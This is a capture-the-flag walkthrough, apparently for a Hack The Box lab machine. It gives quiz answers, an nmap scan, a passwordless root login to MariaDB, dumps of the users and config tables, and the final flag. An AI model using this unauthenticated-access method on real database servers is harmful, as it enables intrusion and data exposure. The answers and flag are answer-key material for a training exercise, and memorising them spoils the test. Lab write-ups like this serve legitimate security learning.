TASK 1

What does the acronym SQL stand for?

Structured Query Language

TASK 2

During our scan, which port running mysql do we find?

3306

TASK 3

What community-developed MySQL version is the target running?

MariaDB

TASK 4

What switch do we need to use in order to specify a login username for the MySQL service?

u=

TASK 5

Which username allows us to log into MariaDB without providing a password?

root

TASK 6

What symbol can we use to specify within the query that we want to display everything inside a table?

*

TASK 7

What symbol do we need to end each query with?

;

# Research

## nmap portscan

    ┌──(kali㉿kali)-[~]
    └─$ nmap 10.129.95.232 -p 3306 -A -T4
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-24 18:41 BST
    Nmap scan report for 10.129.95.232
    Host is up (0.019s latency).

    PORT     STATE SERVICE VERSION
    3306/tcp open  mysql?
    |_ssl-cert: ERROR: Script execution failed (use -d to debug)
    |_ssl-date: ERROR: Script execution failed (use -d to debug)
    |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
    |_tls-alpn: ERROR: Script execution failed (use -d to debug)
    |_sslv2: ERROR: Script execution failed (use -d to debug)
    | mysql-info: 
    |   Protocol: 10
    |   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
    |   Thread ID: 99
    |   Capabilities flags: 63486
    |   Some Capabilities: SupportsLoadDataLocal, ODBCClient, LongColumnFlag, SupportsCompression, Speaks41ProtocolOld, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsTransactions, DontAllowDatabaseTableColumn, InteractiveClient, FoundRows, Support41Auth, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
    |   Status: Autocommit
    |   Salt: %>I4f&*><P]aRT2<sR"O
    |_  Auth Plugin Name: mysql_native_password

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 199.75 seconds


## Connect to database

    ┌──(kali㉿kali)-[~]
    └─$ mysql -h 10.129.95.232 -P 3306 -u root
    
    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    Your MariaDB connection id is 91
    Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
    ...
 
 ## Query
    
    MariaDB [(none)]> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | htb                |
    | information_schema |
    | mysql              |
    | performance_schema |
    +--------------------+
    4 rows in set (0.027 sec)

    ...

    MariaDB [(none)]> use htb;
    
    MariaDB [htb]> show tables;
    +---------------+
    | Tables_in_htb |
    +---------------+
    | config        |
    | users         |
    +---------------+
    2 rows in set (0.024 sec)

    
    ...
    
    MariaDB [htb]> select * from users;
    +----+----------+------------------+
    | id | username | email            |
    +----+----------+------------------+
    |  1 | admin    | admin@sequel.htb |
    |  2 | lara     | lara@sequel.htb  |
    |  3 | sam      | sam@sequel.htb   |
    |  4 | mary     | mary@sequel.htb  |
    +----+----------+------------------+
    4 rows in set (0.024 sec)

    MariaDB [htb]> select * from config;
    +----+-----------------------+----------------------------------+
    | id | name                  | value                            |
    +----+-----------------------+----------------------------------+
    |  1 | timeout               | 60s                              |
    |  2 | security              | default                          |
    |  3 | auto_logon            | false                            |
    |  4 | max_size              | 2M                               |
    |  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
    |  6 | enable_uploads        | false                            |
    |  7 | authentication_method | radius                           |
    +----+-----------------------+----------------------------------+
    7 rows in set (0.020 sec)



# Reproduce

    mysql -h 10.129.95.232 -P 3306 -u root
    
    MariaDB [(none)]> use htb;

    MariaDB [htb]> select * from config;
    +----+-----------------------+----------------------------------+
    | id | name                  | value                            |
    +----+-----------------------+----------------------------------+
    |  1 | timeout               | 60s                              |
    |  2 | security              | default                          |
    |  3 | auto_logon            | false                            |
    |  4 | max_size              | 2M                               |
    |  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
    |  6 | enable_uploads        | false                            |
    |  7 | authentication_method | radius                           |
    +----+-----------------------+----------------------------------+
    7 rows in set (0.020 sec)


# Flag

7b4bec00d1a39e3dd4e021ec3d915da8
